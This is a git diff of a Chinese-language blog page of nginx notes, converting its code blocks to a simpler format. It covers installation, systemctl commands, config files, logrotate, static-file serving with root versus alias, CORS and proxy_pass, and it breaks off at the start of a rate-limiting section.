@@ -17,7 +17,7 @@
 <meta property="og:description" content="linode的docs里面是这么介绍的  nginx is a lightweight, high performance web server designed to deliver large amounts of static content quickly with efficient use of system resources. nginx’s strong point is its">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://www.haldir66.ga/static/imgs/scenery151110073841.jpg">
-<meta property="og:updated_time" content="2019-01-20T14:13:07.039Z">
+<meta property="og:updated_time" content="2019-01-25T14:56:51.181Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Nginx使用记录">
 <meta name="twitter:description" content="linode的docs里面是这么介绍的  nginx is a lightweight, high performance web server designed to deliver large amounts of static content quickly with efficient use of system resources. nginx’s strong point is its">
@@ -207,7 +207,13 @@ ga('send', 'pageview');
 <p><img src="https://www.haldir66.ga/static/imgs/scenery151110073841.jpg" alt=""><br><a id="more"></a></p>
 <h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p><a href="http://nginx.org/en/docs/windows.html">Installing nginx on windows</a><br>安装教程，google ‘installing nginx on ubuntu’<br>基本上就是把DigitalOcean写的这些复制粘贴过来</p>
 <p>当然apt get 默认的源可能有些老，所以如果追求最新版本的话，可以<a href="https://launchpad.net/~nginx/+archive/ubuntu/stable">添加ppa</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install nginx</span><br><span class="line"><span class="comment">## We can list the applications configurations that ufw knows how to work with by typing:</span></span><br><span class="line">sudo ufw app list</span><br><span class="line">sudo ufw allow <span class="string">'Nginx HTTP'</span></span><br><span class="line">sudo ufw status</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">sudo apt-get update
+sudo apt-get install nginx
+## We can list the applications configurations that ufw knows how to work with by typing:
+sudo ufw app list
+sudo ufw allow &#39;Nginx HTTP&#39;
+sudo ufw status
+</code></pre>
 <h3 id="1-1-安装失败的解决方案"><a href="#1-1-安装失败的解决方案" class="headerlink" title="1.1 安装失败的解决方案"></a>1.1 安装失败的解决方案</h3><blockquote>
 <p>Job for nginx.service failed because the control process exited with error code.<br> See “systemctl status nginx.service” and “journalctl -xe” for details.<br>invoke-rc.d: initscript nginx, action “start” failed.<br>● nginx.service - A high performance web server and a reverse proxy server<br>   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)</p>
 </blockquote>
@@ -223,7 +229,21 @@ ga('send', 'pageview');
 <blockquote>
 <p>lsof -i:80</p>
 </blockquote>
-<h2 id="2-常用command"><a href="#2-常用command" class="headerlink" title="2. 常用command"></a>2. 常用command</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看当前status</span></span><br><span class="line">systemctl status nginx</span><br><span class="line"><span class="comment">## stop</span></span><br><span class="line">sudo systemctl stop nginx</span><br><span class="line"><span class="comment">## start</span></span><br><span class="line">sudo systemctl start nginx</span><br><span class="line"><span class="comment">##重启</span></span><br><span class="line">sudo systemctl restart nginx</span><br><span class="line"><span class="comment">##  改了配置文件之后可以直接reload，而不会失去连接</span></span><br><span class="line">sudo systemctl reload nginx</span><br><span class="line"><span class="comment">## nginx默认开机启动的,取消开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">disable</span> nginx</span><br><span class="line"><span class="comment">##  加入开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> nginx</span><br></pre></td></tr></table></figure>
+<h2 id="2-常用command"><a href="#2-常用command" class="headerlink" title="2. 常用command"></a>2. 常用command</h2><pre><code class="bash">## 查看当前status
+systemctl status nginx
+## stop
+sudo systemctl stop nginx
+## start
+sudo systemctl start nginx
+##重启
+sudo systemctl restart nginx
+##  改了配置文件之后可以直接reload，而不会失去连接
+sudo systemctl reload nginx
+## nginx默认开机启动的,取消开机启动
+sudo systemctl disable nginx
+##  加入开机启动
+sudo systemctl enable nginx
+</code></pre>
 <h2 id="3-常用目录和文件-直接从DigitalOcean复制过来了"><a href="#3-常用目录和文件-直接从DigitalOcean复制过来了" class="headerlink" title="3. 常用目录和文件(直接从DigitalOcean复制过来了)"></a>3. 常用目录和文件(直接从DigitalOcean复制过来了)</h2><ul>
 <li>/var/www/html ## 就是放默认首页的地方（原因是 /etc/nginx/sites-enabled/default这里面设置的）<blockquote>
 <p>/etc/nginx: The Nginx configuration directory. All of the Nginx configuration files reside here.<br>/etc/nginx/nginx.conf: The main Nginx configuration file. This can be modified to make changes to the Nginx global configuration.<br>/etc/nginx/sites-available/: The directory where per-site “server blocks” can be stored. Nginx will not use the configuration files found in this directory unless they are linked to the sites-enabled directory (see below). Typically, all server block configuration is done in this directory, and then enabled by linking to the other directory.<br>/etc/nginx/sites-enabled/: The directory where enabled per-site “server blocks” are stored. Typically, these are created by linking to configuration files found in the sites-available directory.<br>/etc/nginx/snippets: This directory contains configuration fragments that can be included elsewhere in the Nginx configuration. Potentially repeatable configuration segments are good candidates for refactoring into snippets.</p>
@@ -238,71 +258,379 @@ ga('send', 'pageview');
 <blockquote>
 <p>/usr/share/nginx<br>/usr/share/nginx/html ##最近的版本挪到这里了<br> 用nginx -V 查看那个–prefix=“实际使用的路径”</p>
 </blockquote>
-<h2 id="4-配置文件"><a href="#4-配置文件" class="headerlink" title="4.配置文件"></a>4.配置文件</h2><h3 id="4-1-不想用80端口怎么办-比如跟apache冲突了"><a href="#4-1-不想用80端口怎么办-比如跟apache冲突了" class="headerlink" title="4.1 不想用80端口怎么办(比如跟apache冲突了)"></a>4.1 不想用80端口怎么办(比如跟apache冲突了)</h3><p>修改 /etc/nginx/nginx.conf文件<br>config文件的大致结构就是这样,来自<a href="https://stackoverflow.com/questions/10829402/how-to-start-nginx-via-different-portother-than-80">stackoverflow</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  /var/<span class="built_in">log</span>/nginx/error.log;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">    <span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line"></span><br><span class="line">    log_format  main  <span class="string">'$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">                  <span class="string">'$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">                  <span class="string">'"$http_user_agent" "$http_x_forwarded_for"'</span>; <span class="comment">##这个log format是可以自定义log格式的</span></span><br><span class="line"></span><br><span class="line">    access_log  /var/<span class="built_in">log</span>/nginx/access.log;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    tcp_nodelay        on;</span><br><span class="line"></span><br><span class="line">    gzip  on;</span><br><span class="line">    gzip_disable <span class="string">"MSIE [1-6]\.(?!.*SV1)"</span>;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">    include /etc/nginx/sites-enabled/*;</span><br><span class="line">    <span class="comment">## include F:/nginx/conf/sites-enabled/default; 必须是绝对路径，include不认相对路径</span></span><br><span class="line"></span><br><span class="line">   server &#123;</span><br><span class="line"></span><br><span class="line">        listen       81;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">         proxy_pass  http://94.143.9.34:9500;</span><br><span class="line">         proxy_set_header   Host             <span class="variable">$host</span>:81;</span><br><span class="line">         proxy_set_header   X-Real-IP        <span class="variable">$remote_addr</span>;</span><br><span class="line">         proxy_set_header   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">         proxy_set_header Via    <span class="string">"nginx"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> mail &#123;</span><br><span class="line">      See sample authentication script at:</span><br><span class="line">      http://wiki.nginx.org/NginxImapAuthenticateWithApachePhpScript</span><br><span class="line"></span><br><span class="line">      auth_http localhost/auth.php;</span><br><span class="line">      pop3_capabilities <span class="string">"TOP"</span> <span class="string">"USER"</span>;</span><br><span class="line">      imap_capabilities <span class="string">"IMAP4rev1"</span> <span class="string">"UIDPLUS"</span>;</span><br><span class="line"></span><br><span class="line">     server &#123;</span><br><span class="line">         listen     localhost:110;</span><br><span class="line">         protocol   pop3;</span><br><span class="line">         proxy      on;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     server &#123;</span><br><span class="line">         listen     localhost:143;</span><br><span class="line">         protocol   imap;</span><br><span class="line">         proxy      on;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>比如想要通过81端口访问，加上这么一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       81;</span><br><span class="line">    server_name  example.org  www.example.org;</span><br><span class="line">    root         /var/www/html/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>Checking nginx config file syntax</p>
+<h2 id="4-配置文件"><a href="#4-配置文件" class="headerlink" title="4.配置文件"></a>4.配置文件</h2><h3 id="4-1-不想用80端口怎么办-比如跟apache冲突了"><a href="#4-1-不想用80端口怎么办-比如跟apache冲突了" class="headerlink" title="4.1 不想用80端口怎么办(比如跟apache冲突了)"></a>4.1 不想用80端口怎么办(比如跟apache冲突了)</h3><p>修改 /etc/nginx/nginx.conf文件<br>config文件的大致结构就是这样,来自<a href="https://stackoverflow.com/questions/10829402/how-to-start-nginx-via-different-portother-than-80">stackoverflow</a></p>
+<pre><code class="bash">user www-data;
+worker_processes  1;
+
+error_log  /var/log/nginx/error.log;
+pid        /var/run/nginx.pid;
+
+events {
+    worker_connections  1024;
+    # multi_accept on;
+}
+
+http {
+    include       /etc/nginx/mime.types;
+
+    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;
+                  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;
+                  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; ##这个log format是可以自定义log格式的
+
+    access_log  /var/log/nginx/access.log;
+
+    sendfile        on;
+    #tcp_nopush     on;
+
+    #keepalive_timeout  0;
+    keepalive_timeout  65;
+    tcp_nodelay        on;
+
+    gzip  on;
+    gzip_disable &quot;MSIE [1-6]\.(?!.*SV1)&quot;;
+
+    include /etc/nginx/conf.d/*.conf;
+    include /etc/nginx/sites-enabled/*;
+    ## include F:/nginx/conf/sites-enabled/default; 必须是绝对路径，include不认相对路径
+
+   server {
+
+        listen       81;
+
+        location / {
+         proxy_pass  http://94.143.9.34:9500;
+         proxy_set_header   Host             $host:81;
+         proxy_set_header   X-Real-IP        $remote_addr;
+         proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
+         proxy_set_header Via    &quot;nginx&quot;;
+        }
+    }
+}
+
+ mail {
+      See sample authentication script at:
+      http://wiki.nginx.org/NginxImapAuthenticateWithApachePhpScript
+
+      auth_http localhost/auth.php;
+      pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;
+      imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;
+
+     server {
+         listen     localhost:110;
+         protocol   pop3;
+         proxy      on;
+     }
+
+     server {
+         listen     localhost:143;
+         protocol   imap;
+         proxy      on;
+     }
+ }
+</code></pre>
+<p>比如想要通过81端口访问，加上这么一行</p>
+<pre><code>server {
+    listen       81;
+    server_name  example.org  www.example.org;
+    root         /var/www/html/
+}
+</code></pre><p>Checking nginx config file syntax</p>
 <blockquote>
 <p>nginx -t -c conf/nginx.conf<br>nginx -s quit  //gracefully stop  on windows<br>nginx -s stop // force stop on windows</p>
 </blockquote>
 <h3 id="4-2-限制日志文件的大小"><a href="#4-2-限制日志文件的大小" class="headerlink" title="4.2 限制日志文件的大小"></a>4.2 限制日志文件的大小</h3><p>根据上面的config文件，默认的访问日志是在/var/log/nginx/access.log这个文件里面。限制这个文件的大小的方法：<br><a href="https://serverfault.com/questions/427144/how-to-limit-nginx-access-log-file-size-and-compress">serverfault</a></p>
-<p><a href="http://www.ttlsa.com/linux/the-nginx-log-configuration/">访问日志的设置，以及图形化统计</a>。其实还可以结合awk做文本统计<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/etc/logrotate.d/nginx</span><br><span class="line">/var/log/nginx/access_log &#123;</span><br><span class="line">    rotate 7</span><br><span class="line">    size 5k</span><br><span class="line">    dateext</span><br><span class="line">    dateformat -%Y-%m-%d</span><br><span class="line">    missingok</span><br><span class="line">    compress</span><br><span class="line">    sharedscripts</span><br><span class="line">    postrotate</span><br><span class="line">        test -r /var/run/nginx.pid &amp;&amp; kill -USR1 `cat /var/run/nginx.pid`</span><br><span class="line">    endscript</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>需要注意的是，当网站访问量大后，日志数据就会很多，如果全部写到一个日志文件中去，文件会变得越来越大。文件大速度就会慢下来，比如一个文件几百兆。写入日志的时候，会影响操作速度。另外，如果我想看看访问日志，一个几百兆的文件，下载下来打开也很慢。为了方便对日志进行分析计算，需要对日志进行定时切割。定时切割的方式有按照月切割、按天切割，按小时切割等。最常用的是按天切割。<a href="http://www.codeceo.com/article/nginx-log.html">脚本</a></p>
-<h3 id="4-3-分享特定目录-serve-static-files"><a href="#4-3-分享特定目录-serve-static-files" class="headerlink" title="4.3 分享特定目录(serve static files)"></a>4.3 分享特定目录(serve static files)</h3><p><a href="https://stackoverflow.com/questions/33989060/how-to-serve-a-directory-of-static-files-at-a-certain-location-path-with-nginx">How to serve a directory of static files at a certain location path with nginx?</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name   something.nateeagle.com;</span><br><span class="line"></span><br><span class="line">  location /something &#123;</span><br><span class="line">    alias /home/neagle/something;</span><br><span class="line">    index index.html index.htm;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>有的时候会看到两种写法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">location /static/ &#123;</span><br><span class="line">        root /var/www/app/static/;</span><br><span class="line">        autoindex off;</span><br><span class="line">&#125;</span><br><span class="line">## 结果是/var/www/app/static/static目录</span><br><span class="line"></span><br><span class="line">location /static/ &#123;</span><br><span class="line">        alias /var/www/app/static/;</span><br><span class="line">        autoindex off;</span><br><span class="line">&#125;</span><br><span class="line">##这才是/var/www/app/static目录</span><br></pre></td></tr></table></figure></p>
-<p><a href="https://stackoverflow.com/questions/10631933/nginx-static-file-serving-confusion-with-root-alias">location里面写root还是alias</a></p>
-<p><a href="http://blog.51cto.com/nolinux/1317109">那alias标签和root标签到底有哪些区别呢？</a><br>1、alias后跟的指定目录是准确的,并且末尾必须加“/”，否则找不到文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /c/ &#123;</span><br><span class="line">      alias /a/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果访问站点<a href="http://location/c">http://location/c</a> ，访问的就是/a/目录下的站点信息。<br>2、root后跟的指定目录是上级目录，并且该上级目录下要含有和location后指定名称的同名目录才行，末尾“/”加不加无所谓。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /c/ &#123;</span><br><span class="line">      root /a/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果访问站点<a href="http://location/c，访问的就是/a/c目录下的站点信息。">http://location/c，访问的就是/a/c目录下的站点信息。</a><br>3、一般情况下，在location /中配置root，在location /other中配置alias是一个好习惯。</p>
-<p>在windows平台下这么写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">           root D:/VDownload;</span><br><span class="line">           index index.html index.htm;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
+<p><a href="http://www.ttlsa.com/linux/the-nginx-log-configuration/">访问日志的设置，以及图形化统计</a>。其实还可以结合awk做文本统计</p>
+<pre><code>/etc/logrotate.d/nginx
+/var/log/nginx/access_log {
+    rotate 7
+    size 5k
+    dateext
+    dateformat -%Y-%m-%d
+    missingok
+    compress
+    sharedscripts
+    postrotate
+        test -r /var/run/nginx.pid &amp;&amp; kill -USR1 `cat /var/run/nginx.pid`
+    endscript
+}
+</code></pre><p>需要注意的是，当网站访问量大后，日志数据就会很多，如果全部写到一个日志文件中去，文件会变得越来越大。文件大速度就会慢下来，比如一个文件几百兆。写入日志的时候，会影响操作速度。另外，如果我想看看访问日志，一个几百兆的文件，下载下来打开也很慢。为了方便对日志进行分析计算，需要对日志进行定时切割。定时切割的方式有按照月切割、按天切割，按小时切割等。最常用的是按天切割。<a href="http://www.codeceo.com/article/nginx-log.html">脚本</a></p>
+<h3 id="4-3-分享特定目录-serve-static-files"><a href="#4-3-分享特定目录-serve-static-files" class="headerlink" title="4.3 分享特定目录(serve static files)"></a>4.3 分享特定目录(serve static files)</h3><p><a href="https://stackoverflow.com/questions/33989060/how-to-serve-a-directory-of-static-files-at-a-certain-location-path-with-nginx">How to serve a directory of static files at a certain location path with nginx?</a></p>
+<pre><code>server {
+  listen 80;
+  server_name   something.nateeagle.com;
+
+  location /something {
+    alias /home/neagle/something;
+    index index.html index.htm;
+  }
+}
+</code></pre><p>有的时候会看到两种写法</p>
+<pre><code>location /static/ {
+        root /var/www/app/static/;
+        autoindex off;
+}
+## 结果是/var/www/app/static/static目录
+
+location /static/ {
+        alias /var/www/app/static/;
+        autoindex off;
+}
+##这才是/var/www/app/static目录
+</code></pre><p><a href="https://stackoverflow.com/questions/10631933/nginx-static-file-serving-confusion-with-root-alias">location里面写root还是alias</a></p>
+<p><a href="http://blog.51cto.com/nolinux/1317109">那alias标签和root标签到底有哪些区别呢？</a><br>1、alias后跟的指定目录是准确的,并且末尾必须加“/”，否则找不到文件</p>
+<pre><code>location /c/ {
+      alias /a/
+}
+</code></pre><p>如果访问站点<a href="http://location/c">http://location/c</a> ，访问的就是/a/目录下的站点信息。<br>2、root后跟的指定目录是上级目录，并且该上级目录下要含有和location后指定名称的同名目录才行，末尾“/”加不加无所谓。</p>
+<pre><code>location /c/ {
+      root /a/
+}
+</code></pre><p>如果访问站点<a href="http://location/c，访问的就是/a/c目录下的站点信息。">http://location/c，访问的就是/a/c目录下的站点信息。</a><br>3、一般情况下，在location /中配置root，在location /other中配置alias是一个好习惯。</p>
+<p>在windows平台下这么写</p>
+<pre><code>location / {
+           root D:/VDownload;
+           index index.html index.htm;
+       }
+</code></pre><blockquote>
 <p>nginx -s reload 然后重启nginx</p>
 </blockquote>
 <h3 id="4-4-Nginx软链接"><a href="#4-4-Nginx软链接" class="headerlink" title="4.4 Nginx软链接"></a>4.4 Nginx软链接</h3><p>目测不能用软链接</p>
-<p>###4.5 Nginx通过CORS实现跨域<br>在nginx.conf里找到server项,并在里面添加如下配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">add_header &apos;Access-Control-Allow-Origin&apos; &apos;http://example.com&apos;;</span><br><span class="line">add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;</span><br><span class="line">add_header &apos;Access-Control-Allow-Headers&apos; &apos;Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With&apos;;</span><br><span class="line">add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET,POST,OPTIONS&apos;;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>但上述配置只能实现允许一个domain或者*实现跨域，Nginx允许多个域名跨域访问<br>在location context的上层添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">map $http_origin $corsHost &#123;</span><br><span class="line">    default 0;</span><br><span class="line">    &quot;~http://www.example.com&quot; http://www.example.com;</span><br><span class="line">    &quot;~http://m.example.com&quot; http://m.example.com;</span><br><span class="line">    &quot;~http://wap.example.com&quot; http://wap.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.example2.com;</span><br><span class="line">    root /usr/share/nginx/html;</span><br><span class="line">    location /</span><br><span class="line">    &#123;</span><br><span class="line">        add_header Access-Control-Allow-Origin $corsHost;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>###4.5 Nginx通过CORS实现跨域<br>在nginx.conf里找到server项,并在里面添加如下配置</p>
+<pre><code>location / {
+add_header &#39;Access-Control-Allow-Origin&#39; &#39;http://example.com&#39;;
+add_header &#39;Access-Control-Allow-Credentials&#39; &#39;true&#39;;
+add_header &#39;Access-Control-Allow-Headers&#39; &#39;Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With&#39;;
+add_header &#39;Access-Control-Allow-Methods&#39; &#39;GET,POST,OPTIONS&#39;;
+...
+}
+</code></pre><p>但上述配置只能实现允许一个domain或者*实现跨域，Nginx允许多个域名跨域访问<br>在location context的上层添加</p>
+<pre><code class="config">map $http_origin $corsHost {
+    default 0;
+    &quot;~http://www.example.com&quot; http://www.example.com;
+    &quot;~http://m.example.com&quot; http://m.example.com;
+    &quot;~http://wap.example.com&quot; http://wap.example.com;
+}
+
+server
+{
+    listen 80;
+    server_name www.example2.com;
+    root /usr/share/nginx/html;
+    location /
+    {
+        add_header Access-Control-Allow-Origin $corsHost;
+    }
+}
+</code></pre>
 <h2 id="5-proxy-pass"><a href="#5-proxy-pass" class="headerlink" title="5. proxy_pass"></a>5. proxy_pass</h2><p>根据<a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-node-js-application-for-production-on-ubuntu-14-04">how-to-set-up-a-node-js-application-for-production-on-ubuntu-14-04</a></p>
 <blockquote>
-<p>/etc/nginx/sites-available/default<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://APP_PRIVATE_IP_ADDRESS:8080; // A应用跑在8080端口，外部访问http://example.com/即可访问应用服务</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &apos;upgrade&apos;;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_cache_bypass $http_upgrade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /app2 &#123;</span><br><span class="line">       proxy_pass http://APP_PRIVATE_IP_ADDRESS:8081; // B应用跑在8081端口，外部访问http://example.com/app2即可访问应用服务</span><br><span class="line">       proxy_http_version 1.1;</span><br><span class="line">       proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">       proxy_set_header Connection &apos;upgrade&apos;;</span><br><span class="line">       proxy_set_header Host $host;</span><br><span class="line">       proxy_cache_bypass $http_upgrade;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>/etc/nginx/sites-available/default<br>``` config<br>server {<br>    listen 80;</p>
 </blockquote>
-<h3 id="5-1-pratical-take-aways"><a href="#5-1-pratical-take-aways" class="headerlink" title="5.1 pratical take aways"></a>5.1 pratical take aways</h3><p><a href="http://seanlook.com/2015/05/17/nginx-location-rewrite/">nginx配置location总结及rewrite规则写法</a></p>
-<h3 id="ddos防御"><a href="#ddos防御" class="headerlink" title="ddos防御"></a>ddos防御</h3><p>from <a href="https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/">mitigating-ddos-attacks-with-nginx-and-nginx-plus/</a></p>
-<p><strong>allow a single client IP address to attempt to login only every 2 seconds (equivalent to 30 requests per minute):</strong></p>
-<ol>
-<li><p>Limiting the Rate of Requests<br>eg: 单ip访问login接口频率不能超过2秒每次。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">limit_req_zone $binary_remote_addr zone=one:10m rate=30r/m;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    # ...</span><br><span class="line">    location /login.html &#123;</span><br><span class="line">        limit_req zone=one;</span><br><span class="line">    # ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Limiting the Number of Connections<br>eg: 单ip访问/store/不能创建超过10条connections</p>
